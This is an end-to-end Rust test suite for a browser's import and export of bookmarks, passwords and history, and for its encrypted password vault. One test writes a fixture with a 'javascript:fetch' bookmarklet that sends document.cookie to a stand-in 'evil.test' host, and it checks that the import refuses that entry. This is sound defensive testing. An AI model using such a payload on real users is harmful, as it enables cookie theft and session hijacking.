//! End to end: everything a profile keeps, written out to the files
//! other browsers read, and brought back in through the same doors the
//! browser itself uses.
//!
//! These drive the public API only — `Keeper`, `Vault`, `Recorder` and
//! `transfer::read` — so they exercise the whole chain below the UI:
//! domain validation, the one-door constructors, the file stores, the
//! format readers and writers, and the sniffing that decides which is
//! which.

use std::path::{Path, PathBuf};

use cryo::bookmarks::{self, Keeper};
use cryo::persist::{self, Recorder};
use cryo::transfer::{self, Payload, Source};
use cryo::vault::{self, Vault};

/// A directory of this test's own, cleaned on the way out.
struct Scratch(PathBuf);

impl Scratch {
    fn new(tag: &str) -> Self {
        let dir = std::env::temp_dir().join(format!(
            "cryo-e2e-{tag}-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("scratch dir");
        Self(dir)
    }

    fn path(&self, name: &str) -> PathBuf {
        self.0.join(name)
    }
}

impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn keeper(at: &Path) -> Keeper {
    Keeper::open(bookmarks::JsonFile::new(at.to_path_buf()))
}

fn bookmark(title: &str, url: &str, folder: &str) -> bookmarks::Draft {
    bookmarks::Draft {
        title: title.to_string(),
        url: url.to_string(),
        folder: folder.to_string(),
        added_at: 1_700_000_000,
        favicon: None,
    }
}

fn credential(origin: &str, user: &str, secret: &str) -> vault::Draft {
    vault::Draft {
        origin: origin.to_string(),
        username: user.to_string(),
        secret: secret.to_string(),
        note: String::new(),
        updated_at: 1_700_000_000,
    }
}

/// Every bookmark as a comparable row.
fn rows(keeper: &Keeper) -> Vec<(String, String, String)> {
    let mut out: Vec<(String, String, String)> = keeper
        .marks()
        .rows()
        .iter()
        .map(|b| (b.title().into(), b.url().into(), b.folder().into()))
        .collect();
    out.sort();
    out
}

#[test]
fn bookmarks_survive_a_trip_out_to_html_and_back() {
    let dir = Scratch::new("bm");
    let mut mine = keeper(&dir.path("bookmarks.json"));
    for draft in [
        bookmark("On the bar", "https://bar.test/", ""),
        bookmark("Rust Blog", "https://blog.rust-lang.org/", "Dev/Rust"),
        bookmark("Odd & <chars>", "https://odd.test/?a=1&b=2", "Dev"),
        bookmark("Элемент", "https://unicode.test/", "Разное"),
    ] {
        mine.add(&draft).expect("keep the page");
    }

    // Export, exactly as the Export pane does.
    let marks: Vec<&bookmarks::Bookmark> = mine.marks().rows().iter().collect();
    let file = dir.path("cryo-bookmarks.html");
    transfer::write(&file, &transfer::netscape::render(&marks, 1_700_000_999)).expect("write");

    // Import into a fresh profile, exactly as the Import pane does.
    let bundle = transfer::read(&Source::File(file.clone()), 1).expect("read the export");
    assert_eq!(bundle.payload, Payload::Bookmarks);
    let mut theirs = keeper(&dir.path("other.json"));
    let report = theirs.add_all(&bundle.bookmarks).expect("merge");
    assert_eq!(report.added, 4);
    assert_eq!(report.rejected, 0);
    assert_eq!(rows(&mine), rows(&theirs), "a round trip loses nothing");

    // The same file again changes nothing: an import is idempotent.
    let again = transfer::read(&Source::File(file), 1).expect("read again");
    let report = theirs.add_all(&again.bookmarks).expect("merge again");
    assert_eq!(report.added, 0);
    assert_eq!(report.duplicates, 4);
    assert_eq!(theirs.marks().len(), 4);
}

#[test]
fn an_imported_bar_lands_on_the_bar_and_persists() {
    let dir = Scratch::new("bar");
    let file = dir.path("edge.html");
    // What Edge writes when you ask it to export favourites.
    std::fs::write(
        &file,
        "<!DOCTYPE NETSCAPE-Bookmark-file-1>\n<DL><p>\n\
         <DT><H3 PERSONAL_TOOLBAR_FOLDER=\"true\">Favorites bar</H3>\n<DL><p>\n\
         <DT><A HREF=\"https://pinned.test/\" ADD_DATE=\"1600000000\">Pinned</A>\n\
         </DL><p>\n\
         <DT><H3>Other favorites</H3>\n<DL><p>\n\
         <DT><A HREF=\"https://filed.test/\">Filed</A>\n\
         </DL><p>\n</DL><p>\n",
    )
    .expect("write the export");

    let store = dir.path("bookmarks.json");
    let bundle = transfer::read(&Source::File(file), 1).expect("read");
    {
        let mut mine = keeper(&store);
        assert_eq!(mine.add_all(&bundle.bookmarks).expect("merge").added, 2);
        assert_eq!(mine.marks().bar().count(), 1, "the toolbar became the bar");
        assert_eq!(mine.marks().folders(), vec!["Other favorites"]);
    }
    // The flush happened on merge: a new session sees the same bar.
    let reopened = keeper(&store);
    assert_eq!(reopened.marks().len(), 2);
    assert_eq!(
        reopened.marks().bar().next().unwrap().url(),
        "https://pinned.test/"
    );
    assert_eq!(
        reopened.marks().bar().next().unwrap().added_at(),
        1_600_000_000,
        "the source's own date is kept"
    );
}

#[test]
fn a_bookmarklet_in_an_imported_file_is_refused_without_costing_the_file() {
    let dir = Scratch::new("bad");
    let file = dir.path("mixed.html");
    std::fs::write(
        &file,
        "<!DOCTYPE NETSCAPE-Bookmark-file-1>\n<DL><p>\n\
         <DT><A HREF=\"javascript:fetch('https://evil.test/'+document.cookie)\">Handy tool</A>\n\
         <DT><A HREF=\"https://fine.test/\">Fine</A>\n</DL><p>\n",
    )
    .expect("write");
    let bundle = transfer::read(&Source::File(file), 1).expect("read");
    assert_eq!(bundle.bookmarks.len(), 2, "the format reads both rows");

    let mut mine = keeper(&dir.path("bookmarks.json"));
    let report = mine.add_all(&bundle.bookmarks).expect("merge");
    assert_eq!(report.added, 1);
    assert_eq!(report.rejected, 1, "the domain refuses the bookmarklet");
    assert_eq!(mine.marks().len(), 1);
    assert_eq!(mine.marks().rows()[0].url(), "https://fine.test/");
}

#[test]
fn an_installed_profile_is_read_in_place() {
    let dir = Scratch::new("profile");
    // The shape Edge, Chrome, Brave and Vivaldi all share.
    let profile = dir.path("Edge").join("User Data").join("Default");
    std::fs::create_dir_all(&profile).expect("profile dir");
    let file = profile.join("Bookmarks");
    std::fs::write(
        &file,
        r#"{"roots":{
             "bookmark_bar":{"type":"folder","name":"Bookmarks bar","children":[
               {"type":"url","name":"Bar page","url":"https://bar.test/",
                "date_added":"13309344000000000"},
               {"type":"folder","name":"News","children":[
                 {"type":"url","name":"Paper","url":"https://paper.test/"}]}]},
             "other":{"type":"folder","name":"Other bookmarks","children":[
               {"type":"url","name":"Elsewhere","url":"https://other.test/"}]}
           },"version":1}"#,
    )
    .expect("write the profile");

    let bundle = transfer::read(&Source::Profile(file), 1).expect("read the profile");
    assert_eq!(bundle.payload, Payload::Bookmarks);
    assert_eq!(
        bundle.source, "Edge · Default",
        "the report names the profile"
    );
    let mut mine = keeper(&dir.path("bookmarks.json"));
    assert_eq!(mine.add_all(&bundle.bookmarks).expect("merge").added, 3);
    assert_eq!(mine.marks().bar().count(), 1);
    assert_eq!(mine.marks().folders(), vec!["News", "Other bookmarks"]);
    assert_eq!(
        mine.marks().rows()[0].added_at(),
        1_664_870_400,
        "Chromium's 1601 epoch converts"
    );
}

#[test]
fn passwords_survive_a_trip_out_to_csv_and_back() {
    let dir = Scratch::new("pw");
    let store = dir.path("vault.bin");
    let mut mine = Vault::open(vault::SealedFile::new(store.clone(), protector()));
    for draft in [
        credential("https://a.test/", "bob", "hunter2"),
        credential("https://b.test/", "ann", "pw,with \"quotes\""),
        credential("android://hash@com.example.app", "", "mobile"),
    ] {
        mine.add(&draft).expect("save the sign-in");
    }

    let creds: Vec<&vault::Credential> = mine.credentials().rows().iter().collect();
    let file = dir.path("cryo-passwords.csv");
    transfer::write(&file, &transfer::passwords::render(&creds)).expect("write");

    let bundle = transfer::read(&Source::File(file), 42).expect("read the export");
    assert_eq!(bundle.payload, Payload::Passwords);
    let mut theirs = Vault::open(vault::SealedFile::new(
        dir.path("other-vault.bin"),
        protector(),
    ));
    let report = theirs.add_all(&bundle.credentials).expect("merge");
    assert_eq!(report.added, 3);
    assert_eq!(report.rejected, 0);
    for (origin, user, secret) in [
        ("https://a.test/", "bob", "hunter2"),
        ("https://b.test/", "ann", "pw,with \"quotes\""),
        ("android://hash@com.example.app", "", "mobile"),
    ] {
        let found = theirs
            .credentials()
            .find(origin, user)
            .unwrap_or_else(|| panic!("{origin} came back"));
        assert_eq!(found.secret().expose(), secret);
    }

    // Re-importing the same file is not three new rows.
    let again = transfer::read(&Source::File(dir.path("cryo-passwords.csv")), 42).expect("read");
    let report = theirs.add_all(&again.credentials).expect("merge again");
    assert_eq!(report.added, 0);
    assert_eq!(report.duplicates, 3);
}

#[test]
fn a_saved_password_is_not_readable_in_the_file_it_is_saved_in() {
    let dir = Scratch::new("sealed");
    let store = dir.path("vault.bin");
    let mut mine = Vault::open(vault::SealedFile::new(store.clone(), protector()));
    mine.add(&credential("https://bank.test/", "bob", "swordfish"))
        .expect("save");

    let raw = std::fs::read(&store).expect("the vault was written");
    assert!(
        !contains(&raw, b"swordfish"),
        "the password must not be on the disk in the clear"
    );
    assert!(
        !contains(&raw, b"bank.test"),
        "nor the list of sites it signs in to"
    );

    // The same account opens it again.
    let reopened = Vault::open(vault::SealedFile::new(store, protector()));
    assert!(reopened.locked_out().is_none());
    assert_eq!(
        reopened
            .credentials()
            .find("https://bank.test/", "bob")
            .expect("still there")
            .secret()
            .expose(),
        "swordfish"
    );
}

#[test]
fn a_vault_sealed_to_someone_else_refuses_rather_than_losing_it() {
    let dir = Scratch::new("wrongkey");
    let store = dir.path("vault.bin");
    Vault::open(vault::SealedFile::new(store.clone(), protector()))
        .add(&credential("https://a.test/", "bob", "pw"))
        .expect("save");

    // Another Windows account: the key does not open this file.
    let mut theirs = Vault::open(vault::SealedFile::new(store.clone(), vault::fake::Wrongkey));
    assert!(theirs.locked_out().is_some(), "the vault says it is shut");
    assert!(
        theirs
            .add(&credential("https://b.test/", "ann", "pw"))
            .is_err(),
        "a shut vault must not overwrite the file it could not read"
    );

    // Nothing was destroyed: the owner still opens it.
    let mine = Vault::open(vault::SealedFile::new(store, protector()));
    assert_eq!(mine.credentials().len(), 1);
}

#[test]
fn history_survives_a_trip_out_to_csv_and_back() {
    let dir = Scratch::new("hist");
    let mut mine = Recorder::open(persist::JsonFile::new(dir.path("history.json")));
    mine.record("https://often.test", Some("Often"), 1_600_000_000)
        .expect("record");
    mine.record("https://often.test", Some("Often"), 1_600_000_100)
        .expect("record");
    mine.record("https://once.test", None, 1_600_000_200)
        .expect("record");

    let file = dir.path("cryo-history.csv");
    transfer::write(&file, &transfer::history::render(mine.entries())).expect("write");

    let bundle = transfer::read(&Source::File(file.clone()), 1).expect("read the export");
    assert_eq!(bundle.payload, Payload::History);
    let mut theirs = Recorder::open(persist::JsonFile::new(dir.path("other-history.json")));
    let report = theirs.import(bundle.visits).expect("merge");
    assert_eq!(report.added, 2);
    assert_eq!(report.merged, 0);

    let often = theirs.matches("often.test", 5);
    assert_eq!(often[0].uses, 2, "the visit count travelled");
    assert_eq!(often[0].last_seen, 1_600_000_100, "and so did the time");
    assert_eq!(often[0].title.as_deref(), Some("Often"));

    // Twice over the same file leaves the counts where they were.
    let again = transfer::read(&Source::File(file), 1).expect("read again");
    let report = theirs.import(again.visits).expect("merge again");
    assert_eq!(report.added, 0);
    assert_eq!(report.merged, 2);
    assert_eq!(theirs.matches("often.test", 5)[0].uses, 2);
}

#[test]
fn history_merges_rather_than_double_counting_a_shared_visit() {
    let dir = Scratch::new("merge");
    let mut mine = Recorder::open(persist::JsonFile::new(dir.path("history.json")));
    for _ in 0..3 {
        mine.record("https://shared.test", Some("Mine"), 10)
            .expect("record");
    }
    let imported = vec![
        persist::Entry::new("https://shared.test", Some("Theirs"), 9, 5).expect("row"),
        persist::Entry::new("https://new.test", None, 1, 20).expect("row"),
    ];
    let report = mine.import(imported).expect("merge");
    assert_eq!(report.added, 1);
    assert_eq!(report.merged, 1);
    let shared = mine.matches("shared.test", 5);
    assert_eq!(shared[0].uses, 9, "the stronger count, not the sum");
    assert_eq!(shared[0].last_seen, 10, "the later visit");
    assert_eq!(shared[0].title.as_deref(), Some("Mine"), "our own title");
}

#[test]
fn each_kind_of_file_is_recognised_by_what_is_in_it() {
    let dir = Scratch::new("sniff");
    let cases: [(&str, &str, Payload); 4] = [
        (
            "favourites.txt",
            "<!DOCTYPE NETSCAPE-Bookmark-file-1>\n<DL><p><DT><A HREF=\"https://a.test\">A</A>\n</DL>",
            Payload::Bookmarks,
        ),
        (
            "Bookmarks",
            r#"{"roots":{"bookmark_bar":{"type":"folder","children":[
                 {"type":"url","name":"A","url":"https://a.test"}]}}}"#,
            Payload::Bookmarks,
        ),
        (
            "secrets.dat",
            "name,url,username,password,note\nA,https://a.test,bob,pw,\n",
            Payload::Passwords,
        ),
        (
            "visits.csv",
            "url,title,visits,last_visit\nhttps://a.test,A,2,1970-01-01T00:00:09Z\n",
            Payload::History,
        ),
    ];
    for (name, body, expected) in cases {
        let file = dir.path(name);
        std::fs::write(&file, body).expect("write");
        let bundle = transfer::read(&Source::File(file), 1)
            .unwrap_or_else(|e| panic!("{name} should be readable: {e}"));
        assert_eq!(bundle.payload, expected, "{name}");
        assert_eq!(bundle.len(), 1, "{name}");
    }

    // Something that is none of the three says so instead of guessing.
    let file = dir.path("notes.txt");
    std::fs::write(&file, "a shopping list, not an export").expect("write");
    assert!(transfer::read(&Source::File(file), 1).is_err());
}

#[test]
fn an_export_of_nothing_is_still_a_file_the_other_browsers_accept() {
    let dir = Scratch::new("empty");
    let file = dir.path("empty.html");
    transfer::write(&file, &transfer::netscape::render(&[], 5)).expect("write");
    let bundle = transfer::read(&Source::File(file), 1).expect("read");
    assert_eq!(bundle.payload, Payload::Bookmarks);
    assert!(bundle.is_empty());
}

/// Windows seals the vault with the signed-in account's DPAPI key, so
/// the test gets the shipped protector there. Everywhere else the
/// shipped protector wants an OS keychain a CI runner does not have —
/// `fake::Masked` stands in, because what the tests check is that the
/// file is unreadable, not which daemon holds the key.
#[cfg(windows)]
fn protector() -> vault::Dpapi {
    vault::Dpapi
}

#[cfg(not(windows))]
fn protector() -> vault::fake::Masked {
    vault::fake::Masked
}

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    haystack.windows(needle.len()).any(|w| w == needle)
}
